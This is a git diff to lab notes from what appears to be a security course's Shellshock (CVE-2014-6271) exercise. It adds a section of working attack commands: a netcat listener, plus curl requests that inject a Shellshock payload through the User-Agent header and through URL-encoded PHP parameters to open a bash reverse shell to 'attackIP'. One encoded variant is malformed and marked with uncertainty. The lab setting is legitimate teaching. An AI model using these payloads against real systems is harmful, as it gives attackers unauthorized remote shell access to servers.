@@ -11,7 +11,23 @@ There is no source code in this chapter?! Just kidding :smirk:
 * [myprog2.cig](../../../../labs/lab04/code/myprog2.cgi): a *hello world* cgi program in bash script
 * [myprog3.cig](../../../../labs/lab04/code/myprog3.cgi): a *vulnerable* cgi program in bash script
 
-## 2. References
+## 2. Reverse shell
+```bash
+# 1. on the attack machine
+nc -lv 9090
+
+# 2. exploit cgi
+curl -A "() { echo normal; }; echo Content_type: text/plain; echo; echo; /bin/bash -i > /dev/tcp/attackIP/ncPort 0<&1 2>&1" http://serverIP/cgi-bin/cgiProgram
+
+# 3. exploit php, the quotes quote the URL encoding of that in # 2.
+curl http://serverIP/phpProgram.php?arg="%28%29%20%7B%20echo%20normal%3B%20%7D%3B%20echo%20Content_type%3A%20text%2Fplain%3B%20echo%3B%20echo%3B%20%2Fbin%2Fbash%20-i%20%3E%20%2Fdev%2Ftcp%2FattackIP%2FncPort%200%3C%261%202%3E%261"
+
+# or ?
+
+curl http://serverIP/phpProgram.php?arg="()20%7B%20echo%20normal%3B%20%7D%3B%20echo%20Content_type%3A%20text%2Fplain%3B%20echo%3B%20echo%3B%20%2Fbin%2Fbash%20-i%20%3E%20%2Fdev%2Ftcp%2FattackIP%2FncPort%200%3C%261%202%3E%261"
+```
+
+## 3. References
 * Command-line HTTP clients
   * [HTTPie](https://httpie.org/)
   * [HTTP Prompt](http://http-prompt.com/)
@@ -28,3 +44,4 @@ There is no source code in this chapter?! Just kidding :smirk:
   * [CVE-2014-6271 Detail](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
 * [netcat](https://en.wikipedia.org/wiki/Netcat)
 * [How To Customize Bash Prompt in Linux](https://phoenixnap.com/kb/change-bash-prompt-linux)
+* [URL Encode/Decode](https://www.urlencoder.org/)
